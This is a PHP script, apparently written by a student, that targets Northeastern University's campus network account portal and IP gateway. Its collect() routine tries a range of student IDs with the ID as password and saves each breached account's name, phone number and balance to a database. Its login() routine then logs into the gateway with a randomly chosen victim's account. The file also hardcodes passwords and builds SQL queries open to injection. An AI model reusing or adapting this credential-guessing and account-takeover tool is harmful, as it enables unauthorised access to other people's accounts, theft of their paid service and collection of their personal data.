<?php

/**
 * Created by PhpStorm.
 * User: Nigel
 * Date: 2015/12/31
 * Time: 12:55
 */
namespace Nigel\NEU;

use Nigel\Utils\simple_html_dom as DOM;

include 'autoload.php';

class IPGW {

    /**
     * @var string cookie文件路径
     */
    protected $cookiefile;
    /**
     * @var string id
     */
    public $id;
    /**
     * @var string pass
     */
    public $pass;
    /**
     * @var resource 数据库连接句柄
     */
    private $dbc;
    /**
     * @var int 错误次数
     */
    private $errorCount = 0;

    /**
     * IPGW constructor.
     *
     * @param string $id
     * @param string $pass
     */
    function __construct($id = '20144633', $pass = '2025642313') {

        $this->id         = $id;
        $this->pass       = $pass;
        $this->cookiefile = __DIR__ . '\\cookie-ipgw.txt';
        $this->dbc = mysqli_connect('localhost:3306', 'nigel', 'nigel', 'neu')
        or die("Error connecting db: " . mysqli_error($this->dbc));
        mysqli_set_charset($this->dbc, 'gbk');
    }

    //function __destruct() {
    //
    //    mysqli_close($this->dbc);
    //}

    /**
     * 登陆校园网管理中心
     * @return bool 登陆是否成功
     * @internal param string $id
     * @internal param string $pass
     *
     */
    private function loginTree() {

        //获取cookie
        $loginUrl = 'http://tree.neu.edu.cn/user/user.Account?operation=login';
        $ch       = curl_init($loginUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_USERPWD, $this->id . ':' . $this->pass);
        //相等于$encodedAuth = base64_encode(self::$pfAdapterUser.":".self::$pfAdapterPasswd);
        //curl_setopt($ch, CURLOPT_HTTPHEADER, array("Authentication : Basic ".$encodedAuth));
        //cookiejar的当前目录为c:xampp，所以必须指定决定路径
        //只带一个cookie行不行？
        curl_setopt($ch, CURLOPT_COOKIEJAR, $this->cookiefile);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'http://tree.neu.edu.cn/user/user.Account?operation=login');
        curl_setopt($ch, CURLOPT_USERAGENT,
                    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36');
        $bool = curl_exec($ch);
        if ($bool === false) {
            if ($this->errorCount++ > 10) {
                die("连接错误: " . curl_error($ch));
            }

            return false;
        }
        curl_close($ch);

        //登陆
        $ch       = curl_init($loginUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_USERPWD, $this->id . ':' . $this->pass);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $this->cookiefile);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'http://tree.neu.edu.cn/user/user.Account?operation=login');
        curl_setopt($ch, CURLOPT_USERAGENT,
                    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36');
        $response = curl_exec($ch);
        //user.Account?operation与user_banner.html的唯一区别
        if (false !== strpos($response, iconv('utf-8', 'gbk',
                                              "<!--Add below-->"
                                              . "<td><table><tr><td nowrap><font color=\"ffffff\" >"))
            // 这里的口令错误是utf编码，而网页上的是GBK，所以这里的strpos结果不准确
            && false === strpos($response, iconv('utf-8', 'gbk', "口令错误"))
            && false === strpos($response, iconv('utf-8', 'gbk', '没有输入用户ID'))
        ) {
            return true;
        }

        return false;
    }

    /**
     * @return array|bool 获取信息
     */
    private function getInfo() {


        $url = 'http://tree.neu.edu.cn/user/user.AccountManagement?operation=info&base_dn=self';

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $this->cookiefile);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_USERPWD, $this->id . ':' . $this->pass);
        curl_setopt($ch, CURLOPT_USERAGENT,
                    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36');
        curl_setopt($ch, CURLOPT_REFERER, 'http://tree.neu.edu.cn/user/user.Account?operation=login');
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $infoPage = curl_exec($ch);
        curl_close($ch);
        //获取失败或者账户不活跃
        if ($infoPage === false || false === strpos($infoPage, 'active')) {
            return false;
        }
        $html = preg_replace('/&nbsp;/', '', $infoPage);
        $html = new DOM($html);
        $info = array();

        list($id, $class) = explode(',', $html->find('font[color=#8b4513]', 0)->innertext);
        $info['id']      = explode('=', $id)[1];
        $info['class']   = explode('=', $class)[1];
        $info['balance'] = $html->find('font[color=#8b4513]', 2)->innertext;
        $info['name']    = $html->find('table tr', 1)->find('td', 1)->innertext;
        $info['tel']     = $html->find('table tr', 2)->find('td', 3)->innertext;

        return $info;
    }

    /**
     * 获取一个可用账号并储存
     */
    private function getOne() {

        if ($this->loginTree()) {
            if ($info = $this->getInfo()) {
                $query = "insert into ipgw(id,class,balance,name,tel,aval)"
                         . "VALUES('{$info["id"]}','{$info["class"]}','{$info["balance"]}','{$info["name"]}','{$info["tel"]}',1)";
                mysqli_query($this->dbc, $query) or die("error geting one: " . mysqli_error($this->dbc));

                return true;
            }
        }

        return false;
    }

    /**
     * 清除不能用的账号
     */
    private function clean() {

    }

    /**
     * @return mixed 返回可用账号的数目
     */
    private function count() {

        $count = 'select count(*) from ipgw WHERE aval=1 AND balance >10';
        $res = mysqli_query($this->dbc, $count) or die('Error querying db: ' . mysqli_error($this->dbc));

        return mysqli_fetch_array($res, MYSQLI_NUM)[0];
    }

    /**
     * 查看账号是否存在
     *
     * @param $id string
     *
     * @return bool
     */
    private function exist($id) {

        $query = "select * from ipgw where id = '$id'";
        $res = mysqli_query($this->dbc, $query) or die("Error checking exist: " . mysqli_error($this->dbc));

        return mysqli_fetch_array($res) ? true : false;
    }

    /**
     * 遍历，储存能用的账号
     */
    public function collect() {

        $this->clean();
        $count = $this->count();
        //20140379
        $id = 20147160;
        while ($count < 100 && $id < 20149000) {
            while ($this->exist($id)) {
                ++$id;
                echo "exist: $id\n";
            }
            $this->id   = $id;
            $this->pass = $this->id;
            if ($this->getOne()) {
                echo 'success: ' . $this->id . "\n";
                ++$count;
                ++$id;
            } else {
                //$this->unavailable();
                echo "unavailable: $this->id\n";
                ++$id;
            }
            usleep(250000);
        }

    }

    /**
     * 记录不可用的账号
     */
    private function unavailable() {

        $query = "insert into ipgw(id, aval) VALUES('$this->id', 0)";
        mysqli_query($this->dbc, $query) or die("unavailable: " . mysqli_error($this->dbc));
    }

    /**
     * 登陆IP网关
     *
     * @param $uid       string
     * @param $pass      string
     * @param $operation int 0=connect 2=disconnect 3=disconnectall
     */
    public static function loginIPGW($uid, $pass, $operation = 0) {

        $post    = array(
            'uid'       => $uid,
            'password'  => $pass,
            'operation' => ['connect', 'disconnect', 'disconnectall'][$operation],
            'range'     => '2',
            'timeout'   => '1');
        $post    = http_build_query($post);
        $headers = array(
            "Connection: keep - alive",
            "Cache - Control: max - age = 0",
            "Accept: text / html,application / xhtml + xml,application / xml;q = 0.9,image / webp,*/*;q=0.8",
            "Origin: http://ipgw.neu.edu.cn",
            "Upgrade-Insecure-Requests: 1",
            "Content-Type: application/x-www-form-urlencoded",
            "Accept-Encoding: gzip, deflate",
            "Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4",);

        $url = "http://ipgw.neu.edu.cn/ipgw/ipgw.ipgw";
        $ch  = curl_init();
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'http://ipgw.neu.edu.cn/');
        curl_setopt($ch, CURLOPT_USERAGENT,
                    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36');
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $response = curl_exec($ch);
        curl_close($ch);

        return ($operation == 0 && strpos($response, "Connect successfully"))
               || ($operation == 1 && strpos($response, "Disconnect Succeeded"))
               || ($operation == 2 && strpos($response, "Disconnect All Succeeded"));
    }

    /**
     * 登陆我自己的账号
     * @return bool
     */
    public static function loginMyself() {

        $id   = '20144633';
        $pass = '2025642313';
        if (static::loginIPGW($id, $pass, 2)
            && static::loginIPGW($id, $pass)
        ) {
            echo "登陆成功: " . "$id\n";
        }
    }

    /**
     * 自动选取可用账号登陆
     *
     * @param bool $force 开启强制登陆
     */
    public function login($force = false) {

        $query = "select * from ipgw WHERE aval=1 AND balance >0";
        $res = mysqli_query($this->dbc, $query) or die("login: " . mysqli_error($this->dbc));

        $goodmen = mysqli_fetch_all($res, MYSQLI_ASSOC);

        do {
            //array_rand返回的是一个随机的键名
            $goodman = $goodmen[array_rand($goodmen)];
            $id      = $goodman['id'];
            //断开全部连接
            $force && static::loginIPGW($id, $id, 2);
            usleep(250000);
        } while (!static::loginIPGW($id, $id));

        echo "Thanks to: " . iconv('gbk', 'utf-8', $goodman['name']) . "\n";
    }

}

$ipgw = new IPGW();
// $ipgw->collect();
IPGW::loginMyself();
//$ipgw->login(true);
